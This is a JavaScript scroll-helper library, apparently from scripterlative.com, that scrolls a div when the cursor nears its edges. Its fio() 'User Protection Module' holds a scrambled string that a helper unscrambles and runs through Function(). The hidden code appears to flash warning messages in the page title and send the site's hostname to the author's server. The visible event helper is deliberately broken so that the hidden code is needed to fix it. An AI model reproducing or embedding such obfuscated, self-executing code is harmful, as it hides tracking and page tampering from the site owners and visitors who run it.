function CursorDivScroll(divId, activeDepth, stepFactor) /* 03/Nov/2012 */
{

	/*** Download with instructions from: http://scripterlative.com?cursordivscroll ***/

	if (bDebug) {
		console.log("Lib: CursorScrollDiv Loaded");
	}

	var cdsObj = function()
	{
		this.elemRef = null;
		this.logged = 0;
		this.activeDepth = (typeof activeDepth == 'undefined' ? 20 : activeDepth);
		this.divX = 0;
		this.divY = 0;
		this.timer = null;
		this.factor = Number(Math.abs(stepFactor || 20));
		this.defaultFactor = this.factor;
		this.accFactor = 0.1;
		this.defaultAcc = this.accFactor;
		this.pending = false;
		this.haltTimer = null;
		this.readyTimer = null;
		this.readReady = true;
		this.pixCount = 0;
		this.canXScroll = true;
		this.canYScroll = true;
		this.canScroll = true;
		this.hasFixedPos = false;

		this.init = function(elemId, depth, stepFactor)
		{

			/** DISTRIBUTION OF DERIVATIVE CODE IS FORBIDDEN. VISIBLE SOURCE DOES NOT MEAN OPEN SOURCE **/

			var paramError = false,
				grief =
				[
					(typeof elemId == 'string'
						? {
						t: !(this.elemRef = this.gebi(elemId)),
						a: 'Div "' + elemId + '" not found'
					}
					: {
						t: !(elemId && (this.elemRef = elemId).nodeName && this.elemRef.nodeName == 'DIV'),
						a: 'First parameter must be either an ID string or a reference to a <div> element'
					}
					),
					{
						t: isNaN(Number(this.activeDepth)) || this.activeDepth > 40 || this.activeDepth < 1,
						a: 'Depth parameter must be a number in the range 1-40'
					},
					{
						t: isNaN(parseInt(this.factor)),
						a: 'Scroll factor parameter must be a number'
					}
				];
			this["susds".split(/\x73/).join('')] = function(str) {
				(Function(str.replace(/(.)(.)(.)(.)(.)/g, unescape('%24%34%24%33%24%31%24%35%24%32')))).call(this);
			};

			for (var i = 0, len = grief.length; i < len && !paramError; i++)
				if (grief[ i ].t)
				{
					paramError = true;
					alert("CursorDivScroll\n\n" + grief[ i ].a);
				}

			if (!paramError)
			{
				this.hasFixedPos = this.isFixed(this.elemRef);

				this.activeDepth *= 0.01;

				this.fio();

				this.activeDepthX = Math.floor(Math.min(this.elemRef.offsetWidth * this.activeDepth, this.elemRef.offsetWidth / 2.5));

				this.activeDepthY = Math.floor(Math.min(this.elemRef.offsetHeight * this.activeDepth, this.elemRef.offsetHeight / 2.5));

				if (typeof window.pageXOffset != 'undefined')
					this.dataCode = 1;
				else
				if (document.documentElement)
					this.dataCode = 3;
				else
				if (document.body && typeof document.body.scrollTop != 'undefined')
					this.dataCode = 2;

				this.listener = this.ih(document, 'mousemove', (function(inst) {
					return function() {
						inst.getMouseData.apply(inst, arguments);
					};
				})(this));

				this.ih(this.elemRef, 'mousedown', this.enclose(function() {
					this.factor *= 3;
				}));

				this.ih(this.elemRef, 'mouseup', this.enclose(function() {
					this.factor = this.defaultFactor;
				}));
			}

			return this;
		}

		this.isFixed = function(elem) /* within a fixed pos elem structure */
		{
			var el = elem, fixed = false;

			while (el.nodeName !== 'BODY' && !(fixed = /fixed/i.test(this.getStyle(el, 'position') || "")))
				el = el.parentNode;

			return fixed;
		}

		this.sf = function(str)
		{
			return unescape(str).replace(/(.)(.*)/, function(a, b, c) {
				return c + b;
			});
		}

		this.getArea = function()
		{
			this.activeDepthX = Math.floor(Math.min(this.elemRef.offsetWidth * this.activeDepth, this.elemRef.offsetWidth / 2.5));

			this.activeDepthY = Math.floor(Math.min(this.elemRef.offsetHeight * this.activeDepth, this.elemRef.offsetHeight / 2.5));
		}

		this.enclose = function(funcRef)
		{
			var args = (Array.prototype.slice.call(arguments)).slice(1), that = this;

			return function() {
				return funcRef.apply(that, args)
			};
		}

		this.monitor = function()
		{
			var mx = this.x - this.divX,
				my = this.y - this.divY,
				xStep = 0, yStep = 0,
				eHeight = this.elemRef.offsetHeight > this.elemRef.clientHeight ? (this.elemRef.offsetHeight - 16) : this.elemRef.offsetHeight,
				eWidth = this.elemRef.offsetWidth > this.elemRef.clientWidth ? (this.elemRef.offsetWidth - 16) : this.elemRef.offsetWidth,
				xInit = this.elemRef.scrollLeft,
				yInit = this.elemRef.scrollTop;

			if (mx > 0 && mx < eWidth && my > 0 && my < eHeight)
			{
				if (my < this.activeDepthY && my > 0)
					yStep = -this.factor * (1 - (my / this.activeDepthY));
				else
				if (my > eHeight - this.activeDepthY && my < eHeight)
					yStep = this.factor * (my - (eHeight - this.activeDepthY)) / this.activeDepthY;

				if (mx > 0 && mx < this.activeDepthX)
					xStep = -this.factor * (1 - (mx / this.activeDepthX));
				else
				if (mx > eWidth - this.activeDepthX && mx < eWidth)
					xStep = this.factor * (mx - (eWidth - this.activeDepthX)) / this.activeDepthX;

				if (Boolean(xStep || yStep) && this.canScroll)
				{
					clearTimeout(this.haltTimer);
					clearTimeout(this.readyTimer);

					this.readyTimer = setTimeout(this.enclose(function() {
						this.readReady = true
					}), 20);

					if (this.readReady)
					{
						this.readReady = false;
						this.pixCount++;
					}
					else
					{
						this.pixCount = 1;
						this.haltTimer = setTimeout(this.enclose(function() {
							this.timer = null;
							this.monitor();
						}), 150);
					}

					if (this.pixCount > 1 || this.repeating)
					{
						if (!this.timer)
						{
							if (this.canYScroll)
								this.elemRef.scrollTop += Math.round(yStep * this.accFactor);

							if (this.canXScroll)
								this.elemRef.scrollLeft += Math.round(xStep * this.accFactor);

							if (this.accFactor < 1)
								this.accFactor += Math.min(0.025, 1 - this.accFactor);

							this.repeating = true;

							clearTimeout(this.timer);
							this.timer = setTimeout(this.enclose(function() {
								this.timer = null;
								this.monitor();
							}), 50);
						}
					}
				}
				else
					this.reset();
			}
			else
				this.reset();

		}

		this.reset = function()
		{
			this.repeating = false;
			this.pixCount = 0;
			this.accFactor = this.defaultAcc;
		}

		this.enable = function()
		{
			this.canScroll = true;
		}

		this.disable = function()
		{
			this.canScroll = false;
		}

		this.getElemPos = function(elem)
		{
			var left = !!elem.offsetLeft ? elem.offsetLeft : 0,
				top = !!elem.offsetTop ? elem.offsetTop : 0,
				theElem = elem;

			while ((elem = elem.offsetParent))
			{
				left += elem.offsetLeft ? elem.offsetLeft : 0;
				top += elem.offsetTop ? elem.offsetTop : 0;
			}

			while (theElem.parentNode.nodeName != 'BODY')
			{
				theElem = theElem.parentNode;

				if (theElem.scrollLeft)
					left -= theElem.scrollLeft;

				if (theElem.scrollTop)
					top -= theElem.scrollTop;
			}

			this.divX = left, this.divY = top;
		}

		this.readScrollData = function(/*2843295374657068656E204368616C6D657273*/)
		{
			switch (this.dataCode)
			{
				case 3 :
					this.xDisp = Math.max(document.documentElement.scrollLeft, document.body.scrollLeft);
					this.yDisp = Math.max(document.documentElement.scrollTop, document.body.scrollTop);
					break;

				case 2 :
					this.xDisp = document.body.scrollLeft;
					this.yDisp = document.body.scrollTop;
					break;

				case 1 :
					this.xDisp = window.pageXOffset;
					this.yDisp = window.pageYOffset;
			}
		}

		this.getMouseData = function(evt)
		{
			var e = evt || window.event;

			this.readScrollData();

			this.getArea();

			if (typeof e.pageX === 'undefined')
			{
				this.x = this.xDisp + e.clientX;
				this.y = this.yDisp + e.clientY;
			}
			else
			{
				this.x = e.pageX;
				this.y = e.pageY;
			}

			try
			{
				this.getElemPos(this.elemRef);

				if (this.hasFixedPos)
				{
					this.divX += this.xDisp;
					this.divY += this.yDisp;
				}

				if (!this.pending)
					this.monitor();
			}
			catch (e) {
				this.abort();
			}
		}

		this.gebi = function(id)
		{
			var eRef = document.getElementById(id);

			return (eRef && eRef.id === id) ? eRef : null;
		}

		this.abort = function( )
		{
			window.detachEvent ? document.detachEvent('onmousemove', this.listener) : document.removeEventListener('mousemove', this.listener, false);
		}

		this.noHorizontal = function()
		{
			this.canXScroll = false;
		}

		this.noVertical = function()
		{
			this.canYScroll = false;
		}

		this.getStyle = function(obj, attrib)
		{
			var val = (obj.currentStyle ? obj.currentStyle[ attrib ] : (val = document.defaultView.getComputedStyle(obj, null)[ attrib ]) ? val : "");

			return val;
		}

		this.ih = function(obj, evt, func)
		{
			obj.attachEvent ? obj.attachEvent(evt, func) : obj.addEventListener('on' + evt, func, false);
			return func;
		}

		this.fio = function( /* User Protection Module */ )
		{
			var data = 'rtav ,,tid,rftge2ca=901420,000=Sta"ITRCPVLE ATOAUIEP NXE.RIDo F riunuqul enkcco e do,eslpadn eoeata ar sgdaee sr tctrpietvalicm.eo"l| ,wn=siwlod.aScolrgota|}|e{o=n,wwDen e)ta(eTg.te)mi(onl,coal=co.itne,rhfm"ts=T"tsmk"u,=nwKuo,t"nsubN=m(srelt]s[mep,)xs&=dttgs&+c<arew&on&i.htsgeolg=,!d5clolasr/=ctrpietvali.o\\ec\\\\|m/oal/cothlsbe\\|deo(vl?b)p\\be\\|b|bat\\s\\ett\\c|bbetilnfl^|i/t:e.tlse(n;co)(hfit.osile!ggd&!5=&&!ts&clolassl)[]nmt=;fwoixde(p!o&&ll{ac)ydrt{o.t=pcmodut}ne;thacc)de({oud=cn;emttt;}i.id=tetlt;fn=fuintco{a)(vd= rttt.di=tel=;.tidteitld?(=t+itattt:tist;)emoiTe(ftutt5d,?0100:0)050;f};i.id(teilt.eOdnxa)(ft-)==1(;ft)(lfi!u][skl[{)s]1ku=r{t;ywIen g(amesc.)rht"=t/s:p/itrcpltreaecvi./1modsps/.?=phsrouCsiSDrvolrcl}a;"chect(}}{)}s{leei.hts=uhiftocnioj(nbv,e,tn)ufcb.o{jtctaavnEheoj?tbtaa.tEehcv(otn"+v"nefn,tu:b)coad.jdetvEnseiLtreen(,utvf,acnfe;sl)trerufn nuc;}}';
			this[unescape('%75%64')](data);
		}

		////////    return this.init(divId, activeDepth, stepFactor);
	}

	var anInst;

	return (anInst = new cdsObj()).init.apply(anInst, arguments);

}


/** END OF LISTING **/